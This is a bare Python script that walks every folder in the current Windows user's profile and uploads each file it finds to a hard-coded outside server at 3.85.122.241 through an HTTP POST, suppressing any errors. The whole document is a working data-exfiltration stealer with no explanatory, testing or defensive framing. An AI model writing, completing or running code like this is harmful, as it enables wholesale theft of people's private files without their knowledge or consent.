import os
import glob
import requests
from os import listdir

user = os.environ.get("USERNAME")
path = f'C:/Users/{user}/'
    

for folder in listdir(f'C:/Users/{user}'):
    current = path + folder
    print(">>>>>", current)
    for file in glob.glob(f'{current}/*.*'):
        print(file)
        try:
            url = 'http://3.85.122.241/globo_file.php'
            files = {'file': open(bytes(file, encoding='utf-8', errors='replace'), 'rb')}
            r = requests.post(url, files=files)
        except:
            ...
